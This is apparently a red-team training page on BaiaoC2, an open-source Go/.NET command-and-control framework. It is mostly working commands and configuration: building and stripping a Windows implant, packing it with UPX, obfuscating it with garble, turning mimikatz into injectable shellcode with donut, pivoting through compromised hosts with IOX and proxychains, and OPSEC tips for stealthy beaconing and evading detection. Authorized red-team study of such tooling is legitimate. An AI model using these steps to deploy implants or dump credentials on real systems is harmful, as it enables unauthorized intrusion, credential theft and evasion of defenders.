---
layout: training-page
title: "BaiaoC2 — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - golang
  - dotnet
  - implant
  - open-source
page_key: "c2-baiao"
render_with_liquid: false
---

# BaiaoC2

BaiaoC2 is an open-source, modular Command & Control framework written in Go (implant) and .NET 6.0 (teamserver). It is under active development and targets advanced red team operations with multiple transport protocols, in-memory execution, and a Lua extension system. The teamserver ships as a self-contained binary — no .NET Core runtime required on the server.

## Architecture Overview

```
# Component breakdown:
# ┌──────────────────────────────────────────────────────┐
# │  Operator CLI / GUI  (Go + Fyne GUI framework)       │
# │  Connects to teamserver via WebSocket API            │
# └──────────────┬───────────────────────────────────────┘
#                │ Multiplayer / multi-user gRPC or WS
# ┌──────────────▼───────────────────────────────────────┐
# │  Teamserver  (.NET 6.0, self-contained binary)       │
# │  Manages listeners, agents, tasks, sessions          │
# │  Supports: admin role + user role (2FA with MFA)     │
# └──────┬──────────┬──────────┬──────────┬─────────────┘
#        │ TCP      │ HTTPS    │ DoH      │ QUIC
# ┌──────▼──────────▼──────────▼──────────▼─────────────┐
# │  Implant (Go — Windows / Linux / macOS)              │
# │  Sleep / jitter, retry logic, AES-256 comms          │
# │  Process injection, PE loading, .NET assembly exec   │
# └──────────────────────────────────────────────────────┘
#
# Transport protocols planned:
# - TCP      — direct TCP socket with AES-256 encryption
# - HTTPS    — HTTPS with profile-driven request shaping
# - DoH      — DNS over HTTPS (DNS-based C2)
# - QUIC     — UDP-based QUIC transport
# - TCP Pivot — implant-to-implant lateral relay
```

## Installation & Setup

```
# Prerequisites:
# - Go 1.19+
# - .NET 6.0 SDK (for teamserver)
# - Fyne.io (GUI toolkit for operator client)

# Clone and install dependencies:
git clone https://github.com/CyberSecurityUP/baiaoc2.git
cd baiaoc2
go get fyne.io/fyne/v2

# Run teamserver (reads config/c2profile.json):
go run main.go -mode server

# Run operator client GUI:
go run main.go -mode client

# Cross-compile implant for Windows x64:
GOOS=windows GOARCH=amd64 go build -o implant.exe ./client/payload/
```

## C2 Profile Configuration

```
# config/c2profile.json — controls listener and implant behaviour:
{
  "name": "BaiaoC2",
  "version": "1.0",
  "listeners": [
    {
      "type": "TCP",
      "host": "0.0.0.0",
      "port": 8080,
      "encryption": "AES-256",
      "key": "YOUR_SESSION_KEY_HERE"
    }
  ],
  "implants": {
    "sleep_time": 10,     // seconds between check-ins
    "jitter": 0.2,        // 20% jitter on sleep_time
    "max_retries": 3,
    "retry_interval": 5
  },
  "logging": {
    "level": "info",
    "file": "baiao.log"
  }
}

# Telegram operator notifications (optional):
# Edit profile.json and set Chat ID + API Token:
# "telegram": { "chat_id": "YOUR_CHAT_ID", "api_token": "YOUR_BOT_TOKEN" }
# Teamserver sends a notification when a new implant checks in
```

## Implant Generation

```
# The payload generator creates a Go source file targeting your listener,
# compiles it to a Windows PE, and embeds the session key.

# Implant flow:
# 1. Dial TCP listener: net.Dial("tcp", "IP:PORT")
# 2. Send AES session key (hex-encoded): protocol.SendSessionKey(conn, key)
# 3. Register implant identity:        protocol.RegisterImplant(conn, sessionKey)
# 4. Loop: receive task → execute → send result

# Manual cross-compile (from Linux to Windows x64):
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe tmp_payload.go

# Strip debug symbols to reduce binary size and remove paths:
# -ldflags="-s -w"
#   -s  strip symbol table
#   -w  strip DWARF debug info

# Additional size reduction with UPX:
upx --best --ultra-brute implant.exe
```

## Supported Implant Capabilities

```
# Controller features (as documented in the project):
# - Reverse shell                          — interactive shell session
# - File management                        — upload, download, list, delete
# - Process management                     — list, migrate, kill
# - Network traffic monitoring             — capture/analyze network activity
# - Screenshots                            — capture target desktop
# - Memory loading                         — execute code without touching disk
# - Reverse proxy (IOX-based)              — TCP/UDP port forwarding pivot

# In-memory execution:
# - .NET assemblies (execute-assembly)     — load and run .NET DLL/EXE in memory
# - Inline .NET assembly (inline-assembly) — run without spawning child process
# - Custom RDI shellcode                   — reflective DLL injection (64-bit)
# - donut / Godonut integration            — convert PE to PIC shellcode for injection

# Process injection & migration:
# - Inject shellcode into a running process by PID
# - Migrate the implant to a different process
# - PE loading in memory (Windows + Linux)

# Lua extension system:
# - Custom scripts via Lua (similar to CNA scripts in Cobalt Strike)
# - Automate multi-step attack workflows
# - Community extensions can be loaded at runtime
```

## Generating Shellcode with Donut

```
# Donut converts PE files (.exe/.dll) or .NET assemblies into PIC shellcode.
# BaiaoC2 implants can load this shellcode in-memory.

# Install donut:
pip3 install donut-shellcode

# Convert a .NET assembly to shellcode:
donut -i Execute-Assembly.exe -a 2 -o shellcode.bin
# -a 2  → x64 architecture
# -o    → output file

# Convert a native EXE to shellcode (for use with RDI loaders):
donut -i mimikatz.exe -a 2 -p '"coffee exit"' -o mimi.bin
# -p  → command-line arguments passed to the PE

# Godonut (Go port — same API):
go install github.com/Binject/go-donut/cmd/go-donut@latest
go-donut --in mimikatz.exe --out mimi.bin --arch x64
```

## OPSEC Notes

```
# Current development status — red teamers should be aware:
# - BaiaoC2 is in early development; GUI is still being built with Fyne
# - TCP with AES-256 is the primary working transport at this stage
# - HTTPS, DoH, and QUIC transports are planned features
# - No built-in malleable profile support yet

# Hardening the default config for operational use:
# 1. Change the default AES key from "supersecretkey" to a random 32-byte key:
python3 -c "import os, base64; print(base64.b64encode(os.urandom(32)).decode())"
# 2. Change default port from 8080 to a legitimately common port (443, 8443, 3389...)
# 3. Add jitter (already supported via "jitter": 0.2 in profile)
# 4. Use HTTPS listener (when available) to blend with web traffic
# 5. Set up redirectors (Apache/nginx mod_rewrite or Caddy) in front of teamserver

# Implant OPSEC:
# Strip symbols: GOARGS="-ldflags=-s -w"
# Garble for string obfuscation: github.com/burrowers/garble
garble -seed=random build -o implant.exe ./client/payload/

# The Go implant communicates with AES-256 — traffic analysis shows:
# - Encrypted TCP stream on configured port
# - Fixed sleep/jitter pattern (fingerprint-able without jitter)
# - Default 10s sleep is aggressive — increase to 60-300s for stealthy ops
```

## Extending with IOX Pivot

```
# IOX is a port-forwarding / SOCKS5 proxy tool for pivoting
# BaiaoC2 integrates IOX for reverse proxy functionality

# Forward a port through the implant (run on teamserver):
# iox fwd -l *:8888 -r TARGET:3389

# SOCKS5 proxy through the implant:
# iox proxy -l *:1080
# Then: proxychains nmap -sT -Pn TARGET

# Cross-compile IOX for target (if needed):
git clone https://github.com/EddieIvan01/iox.git
cd iox
GOOS=windows GOARCH=amd64 go build -o iox.exe
```

## Resources

- BaiaoC2 GitHub — `github.com/CyberSecurityUP/baiaoc2`
- Fyne GUI framework — `fyne.io`
- donut shellcode generator — `github.com/TheWover/donut`
- Godonut (Go port) — `github.com/Binject/go-donut`
- garble (Go obfuscation) — `github.com/burrowers/garble`
- IOX pivot tool — `github.com/EddieIvan01/iox`
- See also: [Sliver C2](/c2-frameworks/sliver/), [Mythic C2](/c2-frameworks/mythic/)
